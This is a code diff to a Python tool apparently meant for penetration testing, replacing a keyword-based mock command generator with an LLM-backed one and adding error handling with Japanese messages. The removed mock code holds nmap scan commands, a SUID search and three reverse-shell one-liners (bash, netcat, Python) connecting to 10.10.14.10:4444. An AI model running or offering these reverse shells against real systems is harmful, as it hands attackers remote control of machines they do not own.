@@ -5,6 +5,7 @@ from typing import Dict, List, Optional, Tuple
 
 from wish_models import CommandResult, CommandState, LogFiles, Wish, WishState
 
+from wish_sh.command_generation import CommandGenerator, MockCommandGenerator, LlmCommandGenerator
 from wish_sh.settings import Settings
 from wish_sh.wish_paths import WishPaths
 
@@ -18,6 +19,12 @@ class WishManager:
         self.paths.ensure_directories()
         self.current_wish: Optional[Wish] = None
         self.running_commands: Dict[int, Tuple[subprocess.Popen, CommandResult, Wish]] = {}
+        
+        # 設定に基づいてコマンドジェネレーターを初期化
+        if hasattr(settings, 'use_llm') and settings.use_llm and hasattr(settings, 'llm_api_key') and settings.llm_api_key:
+            self.command_generator = LlmCommandGenerator(settings.llm_api_key, getattr(settings, 'llm_model', 'gpt-4'))
+        else:
+            self.command_generator = MockCommandGenerator()
 
     def save_wish(self, wish: Wish):
         """Save wish to history file."""
@@ -44,34 +51,8 @@ class WishManager:
         return wishes
 
     def generate_commands(self, wish_text: str) -> List[str]:
-        """Generate commands based on wish text (mock implementation)."""
-        # In a real implementation, this would call an LLM
-        # For prototype, return some predefined responses based on keywords
-        commands = []
-        wish_lower = wish_text.lower()
-
-        if "scan" in wish_lower and "port" in wish_lower:
-            commands = [
-                "sudo nmap -p- -oA tcp 10.10.10.40",
-                "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40",
-            ]
-        elif "find" in wish_lower and "suid" in wish_lower:
-            commands = ["find / -perm -u=s -type f 2>/dev/null"]
-        elif "reverse shell" in wish_lower or "revshell" in wish_lower:
-            commands = [
-                "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
-                "nc -e /bin/bash 10.10.14.10 4444",
-                "python3 -c 'import socket,subprocess,os;"
-                "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-                's.connect(("10.10.14.10",4444));'
-                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-                'subprocess.call(["/bin/sh","-i"]);\'',
-            ]
-        else:
-            # Default responses
-            commands = [f"echo 'Executing wish: {wish_text}'", f"echo 'Processing {wish_text}' && ls -la", "sleep 5"]
-
-        return commands
+        """Generate commands based on wish text."""
+        return self.command_generator.generate_commands(wish_text)
 
     def execute_command(self, wish: Wish, command: str, cmd_num: int):
         """Execute a command and capture its output."""
@@ -97,18 +78,34 @@ class WishManager:
                 # Wait for process completion (non-blocking return for UI)
                 return
 
+            except subprocess.SubprocessError as e:
+                error_msg = f"サブプロセスエラー: {str(e)}"
+                stderr_file.write(error_msg)
+                self._handle_command_failure(result, wish, 1, CommandState.OTHERS, error_msg)
+                
+            except PermissionError as e:
+                error_msg = f"権限エラー: コマンド '{command}' の実行権限がありません"
+                stderr_file.write(error_msg)
+                self._handle_command_failure(result, wish, 126, CommandState.OTHERS, error_msg)
+                
+            except FileNotFoundError as e:
+                error_msg = f"コマンドが見つかりません: '{command}'"
+                stderr_file.write(error_msg)
+                self._handle_command_failure(result, wish, 127, CommandState.OTHERS, error_msg)
+                
             except Exception as e:
-                stderr_file.write(f"Failed to execute command: {str(e)}")
+                error_msg = f"予期せぬエラー: {str(e)}"
+                stderr_file.write(error_msg)
+                self._handle_command_failure(result, wish, 1, CommandState.OTHERS, error_msg)
 
-                # Mark the command as failed
-                result.finish(
-                    exit_code=1,
-                    state=CommandState.OTHERS,
-                    log_summarizer=self.summarize_log
-                )
-
-                # Update the command result in the wish object
-                wish.update_command_result(result)
+    def _handle_command_failure(self, result: CommandResult, wish: Wish, exit_code: int, state: CommandState, log_summary: str):
+        """共通のコマンド失敗処理."""
+        result.finish(
+            exit_code=exit_code,
+            state=state,
+            log_summarizer=lambda _: log_summary
+        )
+        wish.update_command_result(result)
 
     def summarize_log(self, log_files: LogFiles) -> str:
         """Generate a simple summary of command logs."""
